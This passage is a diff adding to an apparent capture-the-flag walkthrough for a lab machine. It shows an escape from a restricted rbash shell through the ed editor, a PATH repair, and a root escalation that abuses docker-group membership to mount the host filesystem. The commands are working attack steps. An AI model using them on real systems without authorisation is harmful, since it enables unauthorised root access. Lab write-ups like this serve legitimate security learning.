@@ -126,3 +126,35 @@ Bull's eye we got the password, let's ssh.
 ![image](https://user-images.githubusercontent.com/87468669/210045797-36066132-c2dc-40a5-9b7c-32e9ae4de3e4.png)
 
 Logged in ssh, now let's escalate privs 
+
+![image](https://user-images.githubusercontent.com/87468669/210173315-a78af789-df7a-46d4-ba0e-612bd485e1fd.png)
+
+Omg we have a restricted shell... Let's break out of the rbash
+
+```
+eleanor@peppo:~$ ed
+!'/bin/bash'
+eleanor@peppo:~$ id
+bash: id: command not found
+eleanor@peppo:~$ echo $PATH
+/home/eleanor/bin
+eleanor@peppo:~$ 
+eleanor@peppo:~$ export PATH=$PATH:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+eleanor@peppo:~$ 
+```
+
+![image](https://user-images.githubusercontent.com/87468669/210173463-f1ab6fab-106c-42de-8f68-30715dfbc6e5.png)
+
+Now we broke out of rbash, And typing the command `id` we can see the user eleanor is in the docker group let's escalate the docker to get root.
+
+```
+eleanor@peppo:~$ docker ps
+CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES
+326cfee15738        postgres            "docker-entrypoint.s…"   2 years ago         Up 4 months         0.0.0.0:5432->5432/tcp   postgres
+71aa857fe988        redmine             "/docker-entrypoint.…"   2 years ago         Up 4 months         0.0.0.0:8080->3000/tcp   redmine
+eleanor@peppo:~$ docker run -v /:/mnt --rm -it redmine chroot /mnt bash
+```
+
+![image](https://user-images.githubusercontent.com/87468669/210173661-0c22276b-9016-4f3f-b0e8-536c8dfc1ba0.png)
+
+Boom!!! we got root🤠😎
